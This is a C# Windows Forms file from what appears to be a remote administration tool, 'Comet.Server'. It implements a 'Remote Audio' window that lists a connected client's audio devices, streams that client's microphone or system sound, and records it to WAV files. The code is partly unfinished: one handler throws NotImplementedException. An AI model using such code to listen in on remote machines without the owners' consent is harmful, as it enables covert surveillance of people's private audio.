using Comet.Common.Messages;
using Comet.Server.Helper;
using Comet.Server.Messages;
using Comet.Server.Networking;
using NAudio.Wave;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace Comet.Server.Forms
{
    public partial class FrmAudio : Form
    {
        private readonly Client _connectClient;
        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        private readonly AudioHandler _audioHandler;
        private readonly string _baseDownloadPath;
        GetAudioNames audioNames;

        public FrmAudio(Client client)
        {
            _connectClient = client;
            _audioHandler = new AudioHandler(client);
            RegisterMessageHandler(_audioHandler);
            InitializeComponent();
            _baseDownloadPath = Path.Combine(_connectClient.Value.DownloadDirectory, "Audio Records\\");

            waveInDeviceName.DrawMode = DrawMode.OwnerDrawFixed;
            waveInDeviceName.DrawItem += new DrawItemEventHandler(waveInDeviceName_DrawItem);
        }

        private void RegisterMessageHandler(AudioHandler _audioHandler)
        {
            _connectClient.ClientState += ClientDisconnected;
            _audioHandler.DisplaysChanged += DisplaysChanged;
            _audioHandler.ProgressChanged += UpdateAudio;
            MessageHandler.Register(_audioHandler);
        }

        private void DisplaysChanged(object sender, GetAudioNames value)
        {
            audioNames = value;
            foreach (var item in value?.WaveInDeviceName)
            {
                if (item.Value== "microphone")
                {
                    waveInDeviceName.Items.Add(new ComboBoxItem(item.Key, Properties.Resources.microphone, "microphone"));
                }
                else
                {
                    waveInDeviceName.Items.Add(new ComboBoxItem(item.Key, Properties.Resources.loudspeaker, "system"));
                }
                waveInDeviceName.SelectedIndex = 0;
            }
        }

        private void UpdateAudio(object sender, string value)
        {
            throw new NotImplementedException();
        }

        private void ClientDisconnected(Client s, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void FrmAudio_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Remote Audio", _connectClient);
            _audioHandler.RefreshDisplays();

            for (int i = 0; i < WaveOut.DeviceCount; i++)
            {
                WaveOutCapabilities deviceInfo = WaveOut.GetCapabilities(i);
                OutDevice.Items.Add(deviceInfo.ProductName);
                OutDevice.SelectedIndex = 0;
            }
        }

        // <summary>
        /// Holds the opened Webcam form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmAudio> OpenedForms = new Dictionary<Client, FrmAudio>();

        public static FrmAudio CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmAudio f = new FrmAudio(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        private void startListen_Click(object sender, EventArgs e)
        {
            if (startListen.Text == "Start listening")
            {
                if (OutDevice.SelectedIndex != -1 && waveInDeviceName.SelectedIndex != -1)
                {
                    _audioHandler.StartListen(OutDevice.SelectedIndex, false);
                    startListen.Text = "Stop listening";
                    progressBar1.Style = ProgressBarStyle.Marquee;
                    checkBox1.Enabled = true;
                    checkBox2.Enabled = true;
                }
                else MessageBox.Show("您没有选择设备");
            }
            else if (startListen.Text == "Stop listening")
            {
                _audioHandler.Stop();
                startListen.Text = "Start listening";
                progressBar1.Style = ProgressBarStyle.Blocks;
                checkBox1.Enabled = false;
                checkBox2.Enabled = false;
            }
        }

        private void FrmAudio_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (startListen.Text == "Stop listening")
            {
                UnregisterMessageHandler();
                _audioHandler.Dispose();
                _connectClient.Send(new SendMicrophoneStop());
            }
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_audioHandler);
            _audioHandler.DisplaysChanged -= DisplaysChanged;
            _audioHandler.ProgressChanged -= UpdateAudio;
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox2.Checked && waveInDeviceName.SelectedIndex != -1)
            {
                //如果index为1则为系统声音
                int index = -1;
                foreach (var item in audioNames.WaveInDeviceName)
                {
                    if (item.Key == waveInDeviceName.Text)
                    {
                        index = item.Value == "microphone" ? 0 : 1;
                        break;
                    }
                }
                if (!Directory.Exists(_baseDownloadPath)) Directory.CreateDirectory(_baseDownloadPath);
                if (index == 0)//录麦克风
                {
                    _audioHandler.WaveFileWriter = new WaveFileWriter(_baseDownloadPath + "\\" + DateFormater() + ".wav", new WaveFormat(44100, 1));
                }
                else if (index == 1) //录系统声音
                {
                    _audioHandler.WaveFileWriter = new WaveFileWriter(_baseDownloadPath + "\\" + DateFormater() + ".wav", WaveFormat.CreateIeeeFloatWaveFormat(48000, 2));
                }
            }
            else
            {
                _audioHandler.WaveFileWriter.Close();
                _audioHandler.WaveFileWriter = null;
            }
        }

        string DateFormater()
        {
            DateTime now = DateTime.Now;
            return $"{now.Year}-{now.Month}-{now.Day}-{now.Hour}H{now.Minute}-{now.Second}{now.Millisecond}";
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                if (WaveIn.DeviceCount > 0)
                {
                    if (OutDevice.SelectedIndex != -1)
                    {
                        _connectClient.Send(new SendMicrophoneInit
                        {
                            Index = OutDevice.SelectedIndex,
                        });
                    }
                }
                else
                {
                    MessageBox.Show("您的系统没有麦克风", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    checkBox1.Checked = false;
                }
            }
            else
            {
                _connectClient.Send(new SendMicrophoneStop());
                _audioHandler.Stop();
            }
        }

        private void waveInDeviceName_DrawItem(object sender, DrawItemEventArgs e)
        {
            e.DrawBackground();
            if (e.Index >= 0)
            {
                var item = (ComboBoxItem)waveInDeviceName.Items[e.Index];
                // Draw the image
                e.Graphics.DrawImage(item.Image, new Point(e.Bounds.Left, e.Bounds.Top));
                // Draw the text
                e.Graphics.DrawString(item.Text, e.Font, Brushes.Black, e.Bounds.Left + item.Image.Width+9, e.Bounds.Top + (e.Bounds.Height - e.Font.Height) / 2);
            }
            e.DrawFocusRectangle();
        }

        public class ComboBoxItem
        {
            public string Text { get; set; }
            public string Tag { get; set; }
            public Image Image { get; set; }
            

            public ComboBoxItem(string text, Image image, string tag)
            {
                Text = text;
                Image = image;
                Tag = tag;
            }

            public override string ToString()
            {
                return Text;
            }
        }

    }
}
